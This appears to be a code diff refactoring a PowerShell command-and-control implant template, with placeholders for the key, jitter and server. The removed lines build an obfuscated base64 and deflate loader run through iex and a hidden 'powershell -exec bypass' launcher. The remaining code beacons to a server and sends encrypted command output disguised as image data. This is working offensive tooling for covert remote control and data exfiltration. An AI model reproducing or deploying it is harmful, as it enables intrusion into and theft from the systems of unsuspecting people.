@@ -1,5 +1,14 @@
-$key="%s"
-$jitter='%s'
+#GlobalVars
+
+$Key="%s"
+$Jitter='%s'
+$Global:SleepTime = '%s'
+$URI= "%s"
+$Server = "$s/%s"
+$ServerClean = "$sc"
+$Rotate = ""
+
+
 Function Beacon($sleeptime) {
     if ($sleeptime.ToLower().Contains('m')) {
         $sleeptime = $sleeptime -replace 'm', ''
@@ -20,43 +29,7 @@ Function Beacon($sleeptime) {
     $script:sleeptime = $newsleep
 }
 
-$global:sleeptime = '5'
-Beacon('%s')
-
-$payloadclear = @"
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
-`$df=@("$df")
-`$h=""
-`$sc=""
-`$urls=@("$urls")
-`$curl="$curl"
-`$s=`$urls[0]
-function DEC {${function:DEC}}
-function ENC {${function:ENC}}
-function CAM {${function:CAM}}
-function Get-Webclient {${function:Get-Webclient}}
-function primern {${function:primern}}
-function primers {${function:primers}}
-primers
-Start-Sleep 300
-primers
-Start-Sleep 600
-primers
-"@
-
-$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($payloadclear)
-$CompressedStream = New-Object IO.MemoryStream
-$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
-$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
-$DeflateStream.Dispose()
-$CompressedScriptBytes = $CompressedStream.ToArray()
-$CompressedStream.Dispose()
-$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
-$NewScript = "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(`"$EncodedCompressedScript`"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
-$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
-$EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))
-$payloadraw = "powershell -exec bypass -Noninteractive -windowstyle hidden -e $($EncodedPayloadScript)"
-$payload = $payloadraw -replace "`n", ""
+Beacon($SleepTime)
 
 function GetImgData($cmdoutput) {
     $icoimage = @(%s)
@@ -86,58 +59,8 @@ function GetImgData($cmdoutput) {
     [System.Array]::Copy($cmdoutput, 0, $ImageBytesFull,$imageBytes.Length+$BytePadding.Length, $cmdoutput.Length )
     $ImageBytesFull
 }
-function Create-AesManagedObject($key, $IV) {
-    try {
-      $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
-    } catch {
-      $aesManaged = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"
-    }
-    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-    $aesManaged.BlockSize = 128
-    $aesManaged.KeySize = 256
-    if ($IV) {
-    if ($IV.getType().Name -eq "String") {
-    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
-    }
-    else {
-    $aesManaged.IV = $IV
-    }
-    }
-    if ($key) {
-    if ($key.getType().Name -eq "String") {
-    $aesManaged.Key = [System.Convert]::FromBase64String($key)
-    }
-    else {
-    $aesManaged.Key = $key
-    }
-    }
-    $aesManaged
-}
 
-function Encrypt-String($key, $unencryptedString) {
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
-    $aesManaged = Create-AesManagedObject $key
-    $encryptor = $aesManaged.CreateEncryptor()
-    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
-    [byte[]] $fullData = $aesManaged.IV + $encryptedData
-    [System.Convert]::ToBase64String($fullData)
-}
-
-function Encrypt-Bytes($key, $bytes) {
-    [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
-    $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
-    $gzipStream.Write( $bytes, 0, $bytes.Length )
-    $gzipStream.Close()
-    $bytes = $output.ToArray()
-    $output.Close()
-    $aesManaged = Create-AesManagedObject $key
-    $encryptor = $aesManaged.CreateEncryptor()
-    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
-    [byte[]] $fullData = $aesManaged.IV + $encryptedData
-    $fullData
-}
-function Encrypt-String2($key, $unencryptedString) {
+function Encrypt-CompressedString($key, $unencryptedString) {
     $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
     $CompressedStream = New-Object IO.MemoryStream
     $DeflateStream = New-Object System.IO.Compression.GzipStream $CompressedStream, ([IO.Compression.CompressionMode]::Compress)
@@ -161,16 +84,6 @@ function Decrypt-String($key, $encryptedStringWithIV) {
     [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)))
 }
 
-function Decrypt-String2($key, $encryptedStringWithIV) {
-    $bytes = $encryptedStringWithIV
-    $IV = $bytes[0..15]
-    $aesManaged = Create-AesManagedObject $key $IV
-    $decryptor = $aesManaged.CreateDecryptor()
-    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
-    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
-    $output
-}
-
 function Send-Response($Server, $Key, $TaskId, $Data) {
     $attempts = 0
     while ($attempts -lt 5) {
@@ -178,7 +91,7 @@ function Send-Response($Server, $Key, $TaskId, $Data) {
       try
       {
         $eid = Encrypt-String $Key $TaskId
-        $Output = Encrypt-String2 $Key $Data
+        $Output = Encrypt-CompressedString $Key $Data
         $UploadBytes = getimgdata $Output
         (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
         $attempts = 5;
@@ -196,7 +109,7 @@ function Send-ResponseAsync($Server, $Key, $TaskId, $Data)
   try
   {
       $eid = Encrypt-String $Key $TaskId
-      $Output = Encrypt-String2 $Key $Data
+      $Output = Encrypt-CompressedString $Key $Data
       $UploadBytes = getimgdata $Output
       $wc=(Get-Webclient -Cookie $eid)
       #$Job = Register-ObjectEvent -InputObject $wc -EventName "UploadDataCompleted" -Action {}
@@ -234,11 +147,6 @@ function Resolve-Error ($ErrorRecord=$Error[0])
        $Exception |Format-List * -Force
    }
 }
-
-$URI= "%s"
-$Server = "$s/%s"
-$ServerClean = "$sc"
-$rotate = ""
 
 while($true)
 {
